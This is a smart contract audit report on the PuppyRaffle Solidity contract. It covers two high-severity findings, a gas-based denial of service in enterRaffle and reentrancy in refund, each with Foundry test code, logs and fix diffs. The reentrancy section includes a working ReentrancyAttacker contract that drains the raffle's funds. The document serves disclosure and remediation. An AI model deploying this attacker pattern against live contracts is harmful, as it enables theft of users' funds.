### [H-1] Unchecked looping for duplicate checking in `PuppyRaffle::enterRaffle` function, can lead to a DoS attack with high gas fees!

**Description::**
The `enterRaffle` function has an unchecked loop which can lead to an uncontrolled gas cost increase as players continue to enter the raffle. A black hat can exploit this by entering with thousands (or more) wallet addresses, making it unaffordable for later legitimate users to enter the raffle.

**Impact::**
Uncontrolled gas cost increase can lead to a DoS attack on the protocol.

**Proof of Concept::**
Check the `test_DenialOfService_AUDIT` test in the `PuppyRaffleTest.t.sol` file.
<details>
<summary>Full Code</summary>

```javascript
    function test_DenialOfService_AUDIT() public {
        uint256 playersNum = 100;
        address[] memory players = new address[](playersNum);
        for (uint256 i = 0; i < playersNum; i++) {
            players[i] = address(i);
        }
        // check how much gas it costs for the first 100 players
        uint256 gasBefore = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee * players.length}(players);
        uint256 gasAfter = gasleft();
        uint256 gasUsedFirst = gasBefore - gasAfter;
        console2.log("Gas used for first 100 players:", gasUsedFirst);

        address[] memory playersTwo = new address[](playersNum);
        for (uint256 i = 0; i < playersNum; i++) {
            playersTwo[i] = address(i + playersNum);
        }
        // check how much gas it costs for the second 100 players
        uint256 gasBeforeTwo = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee * players.length}(
            playersTwo
        );
        uint256 gasAfterTwo = gasleft();
        uint256 gasUsedTwo = gasBeforeTwo - gasAfterTwo;
        console2.log("Gas used for second 100 players:", gasUsedTwo);

        console2.log("Gas Difference:", gasUsedTwo - gasUsedFirst);

        assert(gasUsedFirst < gasUsedTwo);
    }
```

</details>
You can run it via

```bash
forge test --mt test_DenialOfService_AUDIT -vvv
```
and check the output proving that the gas difference between the first 100 and the next 100 is so massive that it becomes unaffordable. You will get an output like this:

```plaintext
Logs:
  Gas used for first 100 players: 6538557
  Gas used for second 100 players: 19242109
  Gas Difference: 12703552
```

**Recommended Solution::**
1. Consider allowing duplicates. Users can make new wallet addresses anyway, so a duplicate check only stops the same wallet address, not the same person from entering multiple times.

2. Consider using a mapping to check duplicates. This would allow you to check for duplicates in constant time rather than linear time. Each raffle could have a `uint256` id, and the mapping would map a player address to the raffle id.

```diff
+    mapping(address => uint256) public addressToRaffleId;
+    uint256 public raffleId = 0;
     .
     .
     .
     function enterRaffle(address[] memory newPlayers) public payable {
         require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
         for (uint256 i = 0; i < newPlayers.length; i++) {
             players.push(newPlayers[i]);
+            addressToRaffleId[newPlayers[i]] = raffleId;
         }

-        // Check for duplicates
+       // Check for duplicates only from the new players
+       for (uint256 i = 0; i < newPlayers.length; i++) {
+          require(addressToRaffleId[newPlayers[i]] != raffleId, "PuppyRaffle: Duplicate player");
+       }
-        for (uint256 i = 0; i < players.length; i++) {
-            for (uint256 j = i + 1; j < players.length; j++) {
-                require(players[i] != players[j], "PuppyRaffle: Duplicate player");
-            }
-        }
         emit RaffleEnter(newPlayers);
     }
 .
 .
 .
     function selectWinner() external {
+       raffleId = raffleId + 1;
         require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
```

3. Alternatively, you could use [OpenZeppelin's `EnumerableSet` library](https://docs.openzeppelin.com/contracts/3.x/api/utils#EnumerableSet).

___
### [H-2] External call made before state change in `refund` function, an open invitation for a reentrancy attack

**Description::**
The `refund` function in the `PuppyRaffle` contract is not following the CEI (Checks-Effects-Interactions) pattern, nor does it use OpenZeppelin's reentrancy guard. This can lead to a reentrancy attack by an attacker contract.

**Impact::**
Reentrancy attack as a result of missing reentrancy checks and not following the CEI pattern.

**Proof of Concept::**
Check the `test_ReEntrancy_AUDIT` test & `ReentrancyAttacker` contract in the `PuppyRaffleTest.t.sol` file:
<details>
<summary>Full Test Code</summary>

```javascript
    function test_ReEntrancy_AUDIT() public {
        address[] memory players = new address[](4);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerThree;
        players[3] = playerFour;

        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);

        ReentrancyAttacker attackerContract = new ReentrancyAttacker(
            puppyRaffle
        );
        address attackerAddress = makeAddr("attackerAddress");
        vm.deal(attackerAddress, 1 ether);

        uint256 startingAttackerContractBalance = address(attackerContract)
            .balance;
        uint256 startingRaffleBalance = address(puppyRaffle).balance;

        console2.log(
            "Starting Attacker Contract Balance:",
            startingAttackerContractBalance
        );

        console2.log(
            "Starting Raffle Contract Balance:",
            startingRaffleBalance
        );

        // attack
        vm.prank(attackerAddress);
        attackerContract.attack{value: entranceFee}();

        uint256 endingAttackerContractBalance = address(attackerContract)
            .balance;
        uint256 endingRaffleBalance = address(puppyRaffle).balance;

        console2.log(
            "Ending Attacker Contract Balance:",
            endingAttackerContractBalance
        );

        console2.log("Ending Raffle Contract Balance:", endingRaffleBalance);
    }
```

</details>

<details>
<summary>Full Contract Code</summary>

```javascript
contract ReentrancyAttacker {
    PuppyRaffle puppyRaffle;
    uint256 attackerIndex;
    uint256 entranceFee;

    constructor(PuppyRaffle _puppyRaffle) {
        puppyRaffle = _puppyRaffle;
        entranceFee = _puppyRaffle.entranceFee();
    }

    function attack() external payable {
        address[] memory players = new address[](1);
        players[0] = address(this);
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));
        puppyRaffle.refund(attackerIndex);
    }
    function _stealMoney() internal {
        if (address(puppyRaffle).balance >= entranceFee) {
            puppyRaffle.refund(attackerIndex);
        }
    }
    fallback() external payable {
        _stealMoney();
    }
    receive() external payable {
        _stealMoney();
    }
}
```

</details>

It proves that the contract is vulnerable to reentrancy attacks and that funds can easily be stolen.
Run the foundry test:
```bash
forge test --mt test_ReEntrancy_AUDIT -vvv
```
and you will see something like this:
```text
Logs:
  Starting Attacker Contract Balance: 0
  Starting Raffle Contract Balance: 4000000000000000000
  Ending Attacker Contract Balance: 5000000000000000000
  Ending Raffle Contract Balance: 0
```

**Recommended Solution::**
1. Use OpenZeppelin's [`ReentrancyGuard`](https://docs.openzeppelin.com/contracts/3.x/api/utils#ReentrancyGuard) and apply the `nonReentrant` modifier to the `refund` function.

2. Or follow the CEI (Checks-Effects-Interactions) pattern by updating the contract state before making the external call:

```diff
     function refund(uint256 playerIndex) public {
         address playerAddress = players[playerIndex];
         require(
             playerAddress == msg.sender,
             "PuppyRaffle: Only the player can refund"
         );
         require(
             playerAddress != address(0),
             "PuppyRaffle: Player already refunded, or is not active"
         );

-        payable(msg.sender).sendValue(entranceFee);
-
-        // @AUDIT-HIGH:: ReEntrancy attack possible here, since we are sending value before setting the player to address(0). Consider using Checks-Effects-Interactions pattern to prevent reentrancy attacks.
         players[playerIndex] = address(0);
+
+        payable(msg.sender).sendValue(entranceFee);
+
         emit RaffleRefunded(playerAddress);
     }
```
